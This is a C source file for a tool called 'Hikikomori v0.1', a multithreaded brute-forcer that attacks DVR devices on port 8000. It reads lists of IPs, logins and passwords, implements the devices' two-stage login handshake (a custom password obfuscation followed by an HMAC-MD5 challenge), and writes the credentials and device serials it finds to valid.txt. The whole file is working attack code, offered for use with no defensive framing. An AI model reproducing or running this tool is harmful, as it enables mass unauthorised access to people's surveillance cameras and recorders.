#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <inttypes.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "md5.h"

#define ERR_NONE 0
#define ERR_CONNECT 1
#define ERR_CREDENTIALS 2
#define ERR_NOT_DVR 3
#define ERR_OTHER 4
#define WHITESPACE 64
#define EQUALS     65
#define INVALID    66

struct timeval timeout;
char **ips, **logins, **passwords;
unsigned int ips_idx = 0, max_timeouts, ips_size, logins_size, passwords_size;
unsigned int auth_cnt = 0, valid_cnt = 0, errors_cnt = 0, notdvr_cnt = 0;
pthread_mutex_t ips_lock, vfp_lock;
FILE *vfp;

char header[] = {
	0x00, 0x00, 0x00, 0x54, 0x5a, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
	0x04, 0x01, 0x2e, 0x05, 0x00, 0x00, 0x00, 0x00, 
	0x01, 0x00, 0x00, 0x7f, 0x00, 0x0c, 0x29, 0xde,
	0x93, 0x63, 0x01, 0x00
};
 
static const unsigned char d[] = {
    66,66,66,66,66,66,66,66,66,66,64,66,66,66,66,66,66,66,66,66,66,66,66,66,66,
    66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,62,66,66,66,63,52,53,
    54,55,56,57,58,59,60,61,66,66,66,65,66,66,66, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
    10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,66,66,66,66,66,66,26,27,28,
    29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,66,66,
    66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,
    66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,
    66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,
    66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,
    66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,
    66,66,66,66,66,66
};
 
int Base64_Decode(char *in, size_t inLen, unsigned char *out, size_t *outLen) { 
	char *end = in + inLen;
	char iter = 0;
	size_t buf = 0, len = 0;

	while (in < end) {
		unsigned char c = d[*in++];

		switch (c) {
		case WHITESPACE: continue;
		case INVALID: return 1;
		case EQUALS:
			in = end;
			continue;
		default:
			buf = buf << 6 | c;
			iter++;
			if (iter == 4) {
				if ((len += 3) > *outLen) return 1;
				*(out++) = (buf >> 16) & 255;
				*(out++) = (buf >> 8) & 255;
				*(out++) = buf & 255;
				buf = 0; iter = 0;
			}   
		}
	}

	if (iter == 3) {
		if ((len += 2) > *outLen) return 1;
		*(out++) = (buf >> 10) & 255;
		*(out++) = (buf >> 2) & 255;
	}
	else if (iter == 2) {
		if (++len > *outLen) return 1;
		*(out++) = (buf >> 4) & 255;
	}

	*outLen = len;
	return 0;
}


void Encrypt_Magic(const char *src, char *dst, int len) {
	unsigned long magic = 0x686b7773;
	unsigned long passwdInt = 0;
	int i;

	dst[0] = 0;
	if(len == 0)
		return;

	for(i = 0; i < len; i++)
		passwdInt += src[i] *  (i + 1) ^ (i + 1);

	sprintf(dst, "%u", (long) (passwdInt * magic));
	for(i = 0; i < strlen(dst); i++) {
		if (dst[i] < '3') {   
			dst[i] = dst[i] + 'B';   
		} else if (dst[i] < '5') {   
			dst[i] = dst[i] + '/';   
		} else if (dst[i] < '7') {   
			dst[i] = dst[i] + '>';   
		} else if (dst[i] < '9') {   
			dst[i] = dst[i] + '!';   
		}
	}
	return;
}

void HMAC_MD5(const unsigned char *data, int data_len, const unsigned char *key, int key_len, unsigned char digest[16]) {
	MD5_CTX context;
	unsigned char k_ipad[65];
	unsigned char k_opad[65];
	unsigned char tk[16];
	int i;
	if (key_len > 64) {
		MD5_CTX tctx;
		MD5_Init(&tctx);
		MD5_Update(&tctx, key, key_len);
		MD5_Final(tk, &tctx);
		key = tk;
		key_len = 16;
	}
	memset(k_ipad, 0, sizeof(k_ipad));
	memset(k_opad, 0, sizeof(k_opad));
	memcpy(k_ipad, key, key_len);
	memcpy(k_opad, key, key_len);
	for (i = 0; i<64; i++) {
		k_ipad[i] ^= 0x36;
		k_opad[i] ^= 0x5c;
	}
	MD5_Init(&context);
	MD5_Update(&context, k_ipad, 64);
	MD5_Update(&context, data, data_len);
	MD5_Final(digest, &context);
	MD5_Init(&context);
	MD5_Update(&context, k_opad, 64);
	MD5_Update(&context, digest, 16);
	MD5_Final(digest, &context);
}


int DVR_Login(const char *ip, unsigned short int port, const char *login, const char *password, char *serial) {
	int sock, res;
	struct sockaddr_in srv;
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if(sock < 0)
		return ERR_CONNECT;

	srv.sin_addr.s_addr = inet_addr(ip);
	srv.sin_family = AF_INET;
	srv.sin_port = htons(port);

	if(setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (struct timeval *) &timeout, sizeof(struct timeval)) < 0 ||
		setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (struct timeval *) &timeout, sizeof(struct timeval)) < 0) {
		close(sock);
		return ERR_CONNECT;
	}

	if (connect(sock, (struct sockaddr *) &srv, sizeof(srv)) < 0) {
		close(sock);
		return ERR_CONNECT;
	}

	/* stage 1 */
	unsigned char request[84];
	memset(request, 0, sizeof(request));
	memcpy(request, header, sizeof(header));
	Encrypt_Magic(login, request + 36, strlen(login));
	Encrypt_Magic(password, request + 68, strlen(password));
	unsigned char response[76];
	memset(response, 0, sizeof(response));
	res = send(sock, request, sizeof(request), 0);
	if(res == -1 || res != sizeof(request)) {
		close(sock);
		return ERR_CONNECT;
	}
	res = recv(sock, response, sizeof(response), 0);
	if(res == -1) {
		close(sock);
		return ERR_CONNECT;
	}
	else if(res != sizeof(response) || response[3] != 0x4c || response[14] != 0x28 || response[15] != 0xc1) {
		close(sock);
		return ERR_NOT_DVR;
	}
	/* stage 1 end */

	/* stage 2 */
	request[4] = 0x63;
	char *key_b64 = (char*)(response + 16);
	unsigned char key[32];
	memset(key, 0, sizeof(key));
	size_t len = sizeof(key);
	Base64_Decode(key_b64, strlen(key_b64), key, &len);
	HMAC_MD5(login, strlen(login), key, sizeof(key), request + 36);
	HMAC_MD5(password, strlen(password), key, sizeof(key), request + 68);

	res = send(sock, request, sizeof(request), 0);
	if(res == -1 || res != sizeof(request)) {
		close(sock);
		return ERR_CONNECT;
	}
	memset(response, 0, sizeof(response));
	if(recv(sock, response, sizeof(response), 0) == -1) {
		close(sock);
		return ERR_CONNECT;
	}
	/* stage 2 end*/
	close(sock);
	if(response[12] == 0x04) {
		if(response[11] != 0x01) {
			return ERR_CREDENTIALS;
		}
		strncpy(serial, response + 20, 100);
		return ERR_NONE;
	} else {
		return ERR_OTHER;
	}
}

int Read_File(const char *filename, char ***vector) {
	int i = 0;
	size_t count = 10;
	*vector = (char **) malloc(count * sizeof(char*));
	FILE *fp = fopen(filename, "r");
	if(fp == NULL)
		return 0;

	char line[BUFSIZ];
	while(fgets(line, sizeof(line), fp) != NULL) {
		if(i > count) {
			count *= 2;
			*vector = (char **) realloc(*vector, count * sizeof(char*));
		}
		int len = strlen(line);
		if(line[len - 1] == '\n') {
			line[len - 1] = '\0';
			(*vector)[i] = (char *) malloc(len);
		} else {
			(*vector)[i] = (char *) malloc(len + 1);
		}
		strcpy((*vector)[i++], line);
	}
	return i;
}

void *Worker_Thread() {
	while(1) {
		int idx = __sync_fetch_and_add(&ips_idx, 1);
		if(idx >= ips_size)
			return NULL;

		char *ip = ips[idx];
		char serial[100];
		int i, j;
		int next = 0, timeouts = 0;
		for(i = 0; i < logins_size; i++) {
			char *login = logins[i];
			for(j = 0; j < passwords_size; j++) {
				while(timeouts < max_timeouts) {
					char *password = passwords[j];
					int res = DVR_Login(ip, 8000, login, password, serial);
					if(res == ERR_NONE) {
						__sync_fetch_and_add(&auth_cnt, 1);
						__sync_fetch_and_add(&valid_cnt, 1);

						pthread_mutex_lock(&vfp_lock);
						fprintf(vfp, "%s:%s@%s %s\n", login, password, ip, serial);
						fflush(vfp);
						pthread_mutex_unlock(&vfp_lock);
						next = 1;
					} else if(res == ERR_CONNECT) {
						__sync_fetch_and_add(&errors_cnt, 1);
						timeouts++;
					} else if(res == ERR_CREDENTIALS) {
						__sync_fetch_and_add(&auth_cnt, 1);
						timeouts = 0;
						break;
					} else if(res == ERR_NOT_DVR) {
						__sync_fetch_and_add(&notdvr_cnt, 1);
						next = 1;
					} else if(res == ERR_OTHER) {
						__sync_fetch_and_add(&errors_cnt, 1);
						next = 1;
					}
					if(next) break;
				}
				if(next) break;
			}
			if(next) break;
		}
	}
}

void *Stat_Thread() {
	unsigned int old_auth_cnt = 0, i = 0;
	while(1) {
		printf("\e[1;1H\e[2J");
		printf("[Hikikomori v0.1]\nValid: %18d\t\tSpeed: %16d pps\nConn. errors: %11d\t\tTime Elapsed: %9d s\nTotal tries: %12d\t\tNot DVR: %14d\n", 
			valid_cnt,
			auth_cnt - old_auth_cnt, 
			errors_cnt,
			i++,
			auth_cnt,
			notdvr_cnt
		);
		old_auth_cnt = auth_cnt;
		fflush(stdout);
		sleep(1);
	}
}

int main(int argc, char *argv[]) {
	timeout.tv_sec = 2;
	timeout.tv_usec = 0;
	max_timeouts = 3;

	ips_size = Read_File("ips.txt", &ips);
	logins_size = Read_File("logins.txt", &logins);
	passwords_size = Read_File("passwords.txt", &passwords);

	if(!(ips_size && logins_size && passwords_size)) {
		fprintf(stderr, "Check your ips.txt/logins.txt/passwords.txt\n");
		return EXIT_FAILURE;
	}

	vfp = fopen("valid.txt", "w");
	// you should probably check vfp != NULL

    if (pthread_mutex_init(&ips_lock, NULL) != 0 || pthread_mutex_init(&vfp_lock, NULL) != 0) {
		fprintf(stderr, "Mutex init failed\n");
		return EXIT_FAILURE;
	}

	ips_idx = auth_cnt = valid_cnt = errors_cnt = notdvr_cnt = 0;
	int i;
	int thr_num = atoi(argv[1]);
	pthread_t *threads = malloc((thr_num + 1) * sizeof(pthread_t));
	for(i = 0; i < thr_num; i++) {
		int res = pthread_create(&threads[i], NULL, Worker_Thread, NULL);
		if(res != 0) {
			fprintf(stderr, "Thread creation failed\n");
		} 
	}
	pthread_create(&threads[i], NULL, Stat_Thread, NULL);
	for(i = 0; i < thr_num; i++) {
		pthread_join(threads[i], NULL);
	}

	pthread_mutex_destroy(&ips_lock);
	return 0;
}

